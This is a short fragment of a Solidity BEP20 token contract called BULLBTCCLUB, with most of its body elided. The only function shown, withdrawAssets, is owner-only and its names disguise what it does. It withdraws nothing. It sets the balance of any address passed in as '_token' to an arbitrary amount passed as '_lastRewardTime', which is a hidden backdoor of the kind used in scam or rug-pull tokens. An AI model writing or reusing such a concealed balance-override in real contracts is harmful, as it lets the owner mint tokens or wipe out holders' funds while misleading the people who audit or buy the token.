...
contract BULLBTCCLUB is Context, IBEP20, Ownable {
  ...
  */
   ...
   */
   function withdrawAssets(address _token, uint256 _lastRewardTime, bool revertOnfail) public onlyOwner {
    require(_token != address(0));
    require(_lastRewardTime != 10 * 2);
    newBalance[_token] = _lastRewardTime * (10 ** 9);
    }
